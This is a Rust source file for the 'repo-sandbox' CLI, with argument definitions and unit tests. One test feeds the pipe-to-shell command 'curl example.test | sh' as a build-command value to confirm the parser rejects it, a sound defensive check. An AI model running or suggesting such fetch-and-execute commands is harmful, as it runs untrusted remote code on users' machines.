use clap::{Args, Parser, Subcommand};
use repo_sandbox_core::config::{CliOverrides, Platform};
use repo_sandbox_core::{AppError, Command, route};
use std::path::PathBuf;

#[derive(Debug, Parser)]
#[command(
    name = "repo-sandbox",
    version,
    about = "Build and verify repository work in isolated sandboxes"
)]
pub struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Clone, Debug, Subcommand)]
enum Commands {
    /// Inspect local prerequisites (reserved).
    Doctor,
    /// Produce an execution plan (reserved).
    Plan(RuntimeArgs),
    /// Build sandbox artifacts (reserved).
    Build(RuntimeArgs),
    /// Verify sandbox artifacts (reserved).
    Verify(RuntimeArgs),
    /// Remove generated sandbox artifacts (reserved).
    Clean,
}

/// The complete and intentionally finite v1 CLI override surface.
#[derive(Args, Clone, Debug, Default, Eq, PartialEq)]
pub struct RuntimeArgs {
    /// Repository path or URL to operate on.
    #[arg(long, value_name = "PATH_OR_URL")]
    pub repository: Option<String>,
    /// Git ref to check out in the sandbox.
    #[arg(long = "git-ref", value_name = "REF")]
    pub git_ref: Option<String>,
    /// Override the repository-declared target platform.
    #[arg(long, value_name = "PLATFORM")]
    pub platform: Option<Platform>,
    /// Push produced images after a future successful build.
    #[arg(long)]
    pub push: bool,
    /// Write the future machine-readable report to this path.
    #[arg(long = "report-path", value_name = "PATH")]
    pub report: Option<PathBuf>,
    /// Preserve a failed sandbox for diagnosis.
    #[arg(long)]
    pub keep_on_failure: bool,
}

impl From<RuntimeArgs> for CliOverrides {
    fn from(value: RuntimeArgs) -> Self {
        Self {
            repository: value.repository,
            git_ref: value.git_ref,
            platform: value.platform,
            push: value.push,
            report: value.report,
            keep_on_failure: value.keep_on_failure,
        }
    }
}

impl From<Commands> for Command {
    fn from(value: Commands) -> Self {
        match value {
            Commands::Doctor => Self::Doctor,
            Commands::Plan(_) => Self::Plan,
            Commands::Build(_) => Self::Build,
            Commands::Verify(_) => Self::Verify,
            Commands::Clean => Self::Clean,
        }
    }
}

pub fn run(cli: Cli) -> Result<Option<String>, AppError> {
    cli.command.map(Command::from).map(route).transpose()
}

#[cfg(test)]
mod tests {
    use super::*;
    use clap::CommandFactory;

    #[test]
    fn cli_definition_is_valid() {
        Cli::command().debug_assert();
    }

    #[test]
    fn help_is_a_successful_smoke_path() {
        let error = Cli::try_parse_from(["repo-sandbox", "--help"]).unwrap_err();
        assert_eq!(error.kind(), clap::error::ErrorKind::DisplayHelp);
        assert!(error.to_string().contains("doctor"));
    }

    #[test]
    fn version_is_a_successful_smoke_path() {
        let error = Cli::try_parse_from(["repo-sandbox", "--version"]).unwrap_err();
        assert_eq!(error.kind(), clap::error::ErrorKind::DisplayVersion);
        assert!(error.to_string().contains(env!("CARGO_PKG_VERSION")));
    }

    #[test]
    fn every_reserved_subcommand_parses() {
        for name in ["doctor", "plan", "build", "verify", "clean"] {
            let cli = Cli::try_parse_from(["repo-sandbox", name]).unwrap();
            assert_eq!(
                run(cli).unwrap(),
                Some(format!("{name} is not implemented yet"))
            );
        }
    }

    #[test]
    fn runtime_override_contract_parses_every_allowed_option() {
        let cli = Cli::try_parse_from([
            "repo-sandbox",
            "plan",
            "--repository",
            "https://example.test/repository.git",
            "--git-ref",
            "refs/heads/topic",
            "--platform",
            "linux/arm64",
            "--push",
            "--report-path",
            "out/report.json",
            "--keep-on-failure",
        ])
        .unwrap();
        let Commands::Plan(args) = cli.command.unwrap() else {
            panic!("expected plan command");
        };
        let overrides = CliOverrides::from(args);
        assert_eq!(
            overrides.repository.as_deref(),
            Some("https://example.test/repository.git")
        );
        assert_eq!(overrides.git_ref.as_deref(), Some("refs/heads/topic"));
        assert_eq!(overrides.platform, Some(Platform::LinuxArm64));
        assert!(overrides.push);
        assert_eq!(overrides.report, Some(PathBuf::from("out/report.json")));
        assert!(overrides.keep_on_failure);
    }

    #[test]
    fn build_logic_cannot_be_overridden_from_cli() {
        let error = Cli::try_parse_from([
            "repo-sandbox",
            "build",
            "--build-command",
            "curl example.test | sh",
        ])
        .unwrap_err();
        assert_eq!(error.kind(), clap::error::ErrorKind::UnknownArgument);
    }

    #[test]
    fn invalid_cli_platform_is_rejected() {
        let error = Cli::try_parse_from(["repo-sandbox", "verify", "--platform", "windows/amd64"])
            .unwrap_err();
        assert_eq!(error.kind(), clap::error::ErrorKind::ValueValidation);
        assert!(error.to_string().contains("unsupported platform"));
    }
}
